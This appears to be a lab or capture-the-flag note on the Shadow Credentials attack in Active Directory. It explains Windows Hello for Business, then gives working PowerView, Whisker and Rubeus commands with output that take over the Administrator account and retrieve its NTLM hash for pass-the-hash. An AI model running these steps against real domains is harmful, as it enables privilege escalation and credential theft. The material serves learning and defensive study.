Microsoft introduced **Windows Hello for Business (WHfB)** as a modern and secure way to replace conventional password-based authentication. Instead of relying on traditional passwords, WHfB utilises cryptographic keys for user verification. Users on the Active Directory domain can access the AD using a *PIN or biometrics connected to a pair of cryptographic keys*: public and private.

Here's the procedure to store a new pair of certificates with WHfB:
- **Trusted Platform Module (TPM) public-private key pair generation**: The TPM creates a public-private key pair for the user's account when they enrol. It's crucial to remember that the private key never leaves the TPM and is never disclosed.
- **Client certificate request**: The client initiates a certificate request to receive a trustworthy certificate. The organisation's certificate issuing authority (CA) receives this request and provides a valid certificate.
- **Key storage**: The user account's `msDS-KeyCredentialLink` attribute will be set.
![[68d1798e28e2c4b924d02f8303b40ab3.svg]]

Authentication Process:
- **Authorisation**: The Domain Controller decrypts the client's pre-authentication data using the raw public key stored in the `msDS-KeyCredentialLink` attribute of the user's account.
- **Certificate generation**: The certificate is created for the user by the Domain Controller and can be sent back to the client.
- **Authentication**: After that, the client can log in to the Active Directory domain using the certificate.


---
# Enumeration
Enumerate for users which have the `GenericWrite` permission!
```powershell
# Returns all users priviliges
Find-InterestingDomainAcl -ResolveGuids
```


```powershell
PS C:\Users\hr\Desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hr\Desktop> . .\PowerView.ps1
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

# CN=Administrator is the username
IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=Administrator,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite
```

---
# Exploitation
Use `Whisker` tool!
```powershell
PS C:\Users\hr\Desktop> .\Whisker.exe add /target:Administrator
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password qfyNlIfCjVqzwh1e
[*] Searching for the target account
[*] Target user found: CN=Administrator,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID ae6efd6c-27c6-4217-9675-177048179106
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:
Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0EgglpMIIJZTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

The tool will conveniently provide the *certificate necessary to authenticate the impersonation of the vulnerable user* with a command ready to be launched using `Rubeus`.

```powershell
# This gives the NTLM Hash which can be used for Pass-The-Hash Attack
PS C:\Users\hr\Desktop> .\Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEH[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

..
..
..
NTLM              : DDD22F37A3037852AFGE70FAB93E0CC71 
```

---
For More info, [click here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials)
